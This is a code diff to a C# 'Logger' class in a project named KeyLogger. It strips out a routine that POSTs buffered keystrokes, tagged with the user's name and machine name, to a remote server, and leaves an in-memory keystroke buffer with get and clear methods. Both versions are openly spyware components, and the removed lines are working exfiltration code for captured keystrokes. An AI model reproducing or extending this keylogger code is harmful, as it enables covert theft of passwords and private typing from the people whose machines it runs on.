@@ -1,87 +1,42 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Net.Http;
-using System.Threading.Tasks;
-
-namespace KeyLogger
+﻿namespace KeyLogger
 {
     /// <summary>
-    /// Class managing the logging of the keys in the memory and sending those logs to an online server
+    /// Class managing the logging of the keys in the memory
     /// </summary>
-    public class Logger
+    internal class Logger
     {
-        string logs;
-
-        string serverURL;
-
-        int logsMaxSize;
-
+        string logs = "";
 
 
         /// <summary>
-        /// Constructor
+        /// Returns the current logs and clear them
         /// </summary>
-        /// <param name="serverURL">Adress of the server where to send logs</param>
-        /// <param name="logsMaxSize">Number of chars the 'logs' variable is allowed to contain</param>
-        public Logger(string serverURL, int logsMaxSize)
+        /// <returns>Current logs</returns>
+        public string GetLogs()
         {
-            logs = "";
-            this.serverURL = serverURL;
-            this.logsMaxSize = logsMaxSize;
+            var currentLogs = logs;
+            ClearLogs();
+            return currentLogs;
         }
 
-
+        
         /// <summary>
         /// Add the given key to the 'logs' variable
-        /// Calls the SendLogsToServer() method if the 'logs' variable is too big
         /// </summary>
         /// <param name="keyToLog">String representing a key</param>
-        public async void LogKey(string keyToLog)
+        public void LogKey(string keyToLog)
         {
             logs += keyToLog;
-
-            // logs size shouldn't exceed the limit
-            if(logs.Length > logsMaxSize)
-            {
-                await SendLogsToServer();
-            }
+            // TODO : handle too important log size (example : store in files when too important and clear)
         }
 
 
         /// <summary>
-        /// Make a POST request to the logging server with those params:
-        /// #user's name
-        /// #logs
+        /// Empty logs variable
         /// </summary>
-        public async Task<bool> SendLogsToServer()
+        public void ClearLogs()
         {
-            // No logs, doesn't send a request
-            if (logs.Length == 0)
-                return false;
-
-            using (var client = new HttpClient())
-            {
-                // POST data
-                var content = new FormUrlEncodedContent(new[]
-                {
-                    new KeyValuePair<string, string>("user", Environment.UserName + '@' + Environment.MachineName),
-                    new KeyValuePair<string, string>("logs", logs)
-                });
-                // clear the logs variable
-                logs = "";
-
-                try
-                {
-                    // send POST request
-                    var dummy = await client.PostAsync(serverURL, content);
-                }
-                catch (Exception)
-                {
-                    return false;
-                }
-            }
-
-            return true;
+            logs = "";
         }
     }
 }
